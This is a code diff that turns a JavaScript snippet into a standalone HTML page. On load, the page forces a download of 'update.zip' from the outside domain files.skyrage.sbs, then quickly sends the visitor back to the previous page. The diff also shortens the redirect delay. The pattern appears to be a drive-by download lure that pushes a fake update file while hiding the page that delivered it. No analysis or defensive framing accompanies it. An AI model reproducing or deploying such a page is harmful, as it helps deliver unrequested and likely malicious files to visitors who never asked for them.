@@ -1,20 +1,29 @@
-// This function will download the file at the specified URL
-function downloadFile(url) {
-  var link = document.createElement("a");
-  link.href = url;
-  link.download = true;
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
-}
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+      // This function will download the file at the specified URL
+      function downloadFile(url) {
+        var link = document.createElement("a");
+        link.href = url;
+        link.download = true;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }
 
-// This function will go back to the previous page
-function goBack() {
-  window.history.back();
-}
+      // This function will go back to the previous page
+      function goBack() {
+        window.history.back();
+      }
 
-// Call the downloadFile function with the URL of the file you want to download
-downloadFile("files.skyrage.sbs/update.zip");
+      // Call the downloadFile function with the URL of the file you want to download
+      downloadFile("http://files.skyrage.sbs/update.zip");
 
-// After a delay of 1 second, call the goBack function to go back to the previous page
-setTimeout(goBack, 1000);
+      // After a delay of 1 second, call the goBack function to go back to the previous page
+      setTimeout(goBack, 300);
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
